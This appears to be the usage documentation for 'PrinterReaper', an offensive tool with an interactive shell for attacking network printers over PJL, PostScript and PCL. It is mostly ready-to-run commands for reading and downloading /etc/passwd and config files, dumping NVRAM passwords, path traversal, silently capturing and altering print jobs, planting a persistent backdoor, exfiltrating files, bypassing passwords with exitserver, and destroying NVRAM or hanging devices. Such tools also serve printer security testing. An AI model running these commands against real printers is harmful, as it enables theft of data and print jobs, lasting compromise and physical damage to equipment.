# Interactive Shell

Connect and run commands against the printer interactively. PrinterReaper supports three printer languages across a unified shell interface.

---

## Launching the Shell

```bash
# Auto-detect best language
python printer-reaper.py 192.168.1.100 auto

# PJL (Printer Job Language) — most feature-rich
python printer-reaper.py 192.168.1.100 pjl

# PostScript — job capture, overlays, operator redefinition
python printer-reaper.py 192.168.1.100 ps

# PCL (Printer Command Language) — macro filesystem (legacy HP)
python printer-reaper.py 192.168.1.100 pcl

# Safe mode — verify language supported before connecting
python printer-reaper.py 192.168.1.100 pjl --safe

# Debug mode — print raw bytes on wire
python printer-reaper.py 192.168.1.100 pjl --debug

# Non-interactive batch mode — read commands from file
python printer-reaper.py 192.168.1.100 pjl -i commands.txt

# Log everything sent to printer to file
python printer-reaper.py 192.168.1.100 pjl -o session.log

# Quiet + batch (scripting-friendly)
python printer-reaper.py 192.168.1.100 pjl -i cmds.txt -o out.log -q
```

---

## PJL Shell — Full Command Reference

PJL (Printer Job Language) is supported by HP, Epson, Lexmark, Xerox, Samsung, and most enterprise printers. It gives direct access to the printer filesystem, NVRAM, environment variables, and control functions.

### Identity & Status

```bash
192.168.1.100:/> id           # model, firmware, serial number
192.168.1.100:/> version      # firmware version details
192.168.1.100:/> status       # current printer status (ready, busy, offline)
192.168.1.100:/> uptime       # hours:minutes since last power-on
192.168.1.100:/> pagecount    # total pages ever printed
192.168.1.100:/> papersize    # current paper size setting
```

### Network Information

```bash
192.168.1.100:/> network      # IP, subnet, gateway, DNS, WINS, NTP, MAC
```

**Output:**
```
IP=192.168.1.100  SUBNET=255.255.255.0  GATEWAY=192.168.1.1
DNS=8.8.8.8       NTP=pool.ntp.org      WINS=
MAC=AA:BB:CC:DD:EE:FF
```

### Environment Variables

```bash
192.168.1.100:/> variables      # all current PJL environment variables
192.168.1.100:/> set COPIES 5   # set a PJL variable
192.168.1.100:/> set OUTBIN UPPER
```

### Filesystem

```bash
# Directory listing
192.168.1.100:/> ls             # list current directory
192.168.1.100:/> ls /           # list root
192.168.1.100:/> ls /etc        # list specific path
192.168.1.100:/> ls /webServer/config

# Read files
192.168.1.100:/> cat /etc/passwd
192.168.1.100:/> cat /webServer/config/soe.xml

# Download files to local disk
192.168.1.100:/> download /etc/passwd
192.168.1.100:/> download /webServer/config/soe.xml

# Upload files to printer
192.168.1.100:/> upload local.txt /upload/remote.txt

# File management
192.168.1.100:/> mkdir /test
192.168.1.100:/> delete /tmp/debug.txt

# Search
192.168.1.100:/> find passwd       # search by filename
192.168.1.100:/> find *.xml

# Mirror entire filesystem to local disk
192.168.1.100:/> mirror /
```

### NVRAM

```bash
192.168.1.100:/> nvram read              # dump all NVRAM contents
192.168.1.100:/> nvram write KEY VALUE   # write a key (DANGEROUS — wear out)
```

**Sample NVRAM dump:**
```
NVRAM contents:
  COPIES=1
  PAGEPROTECT=AUTO
  RESOLUTION=600
  TIMEOUT=90
  SERVICEPASSWORD=00000000
```

### Display & Front Panel

```bash
192.168.1.100:/> display "HACKED"      # change LCD message
192.168.1.100:/> display ""            # restore default message
```

### Printer Control

```bash
192.168.1.100:/> offline        # put printer offline (blocks all jobs)
192.168.1.100:/> restart        # restart printer
192.168.1.100:/> reset          # factory reset (DANGEROUS — authorized labs only)
192.168.1.100:/> backup         # backup current configuration
192.168.1.100:/> restore        # restore configuration from backup
```

### Access Control

```bash
192.168.1.100:/> lock           # enable PJL password protection
192.168.1.100:/> unlock PASSWD  # bypass PJL protection with password
```

### Attack Payloads

```bash
192.168.1.100:/> destroy        # NVRAM damage: exhausts write cycles
192.168.1.100:/> flood          # print storm: resource exhaustion
192.168.1.100:/> traverse ../../../etc/passwd  # path traversal
```

### Shell Helpers

```bash
192.168.1.100:/> help           # list all commands
192.168.1.100:/> help download  # detailed help for a specific command
192.168.1.100:/> exit           # close connection
192.168.1.100:/> quit
```

---

## PostScript Shell — Full Command Reference

PostScript is a Turing-complete language interpreted by the printer. It allows full redefinition of operators, filesystem access, and job manipulation.

### Operator Enumeration

```bash
192.168.1.100:ps> dicts         # enumerate systemdict, userdict, globaldict
192.168.1.100:ps> dump          # dump all systemdict entries (verbose)
192.168.1.100:ps> known         # list all known operators
192.168.1.100:ps> search WORD   # search for operators matching keyword
```

### Filesystem

```bash
# List files (filenameforall)
192.168.1.100:ps> ls

# Read file
192.168.1.100:ps> cat /path/to/file

# Download file to disk
192.168.1.100:ps> download /webServer/config/soe.xml
192.168.1.100:ps> download /opt/EpsonInternal/config.xml
```

### Job Manipulation

```bash
# Start capturing all print jobs silently
192.168.1.100:ps> capture

# Stamp all pages with overlay text
192.168.1.100:ps> overlay "CONFIDENTIAL"

# Add diagonal cross-text to all pages
192.168.1.100:ps> cross "DO NOT COPY"

# Replace text on all pages
192.168.1.100:ps> replace "SECRET" "REDACTED"
```

### Denial of Service

```bash
# Infinite loop — printer hangs until power cycle
192.168.1.100:ps> hang

# Print storm — 100 blank pages
192.168.1.100:ps> payload storm 100

# Print banner page
192.168.1.100:ps> payload banner "PRINTER COMPROMISED"
```

### Backdoor / Persistence

```bash
# Attempt persistent access implant via exitserver
192.168.1.100:ps> backdoor

# Exfiltrate file via printed output
192.168.1.100:ps> exfiltrate /etc/passwd
```

### exitserver (bypass password protection)

PostScript's `exitserver` operator exits the current job context and enters the server loop, bypassing user-level protections:

```bash
192.168.1.100:ps> exitserver
# All subsequent commands run at server privilege level
192.168.1.100:ps> systemdict begin  # now accessible
```

---

## PCL Shell — Command Reference

PCL (Printer Command Language) has a virtual filesystem based on macros.

```bash
# List all macros (virtual filesystem)
192.168.1.100:pcl> ls

# Upload a file as a PCL macro
192.168.1.100:pcl> put local_file.txt

# Download macro by ID
192.168.1.100:pcl> get 1000

# Delete a macro
192.168.1.100:pcl> delete 1000
```

---

## Batch Mode Examples

**`commands.txt`:**
```
id
ls /
download /etc/passwd
network
nvram read
exit
```

```bash
python printer-reaper.py 192.168.1.100 pjl -i commands.txt -o session.log -q
```

Output goes to `session.log` and all data is saved to disk.

---

## Supported Protocols

The shell connects to the printer via:

| Protocol | Port | Modes |
|----------|------|-------|
| RAW (JetDirect) | 9100 | PJL, PS, PCL |
| LPD | 515 | PJL, PS, PCL |
| IPP | 631 | PS, PCL |
| HTTP/HTTPS | 80/443 | Web commands (firmware, config) |

The default is RAW/9100. Use `--safe` to verify the port is open before connecting.
